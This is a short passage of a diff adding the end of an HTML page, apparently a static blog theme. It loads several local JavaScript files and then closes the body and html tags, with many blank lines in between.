+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
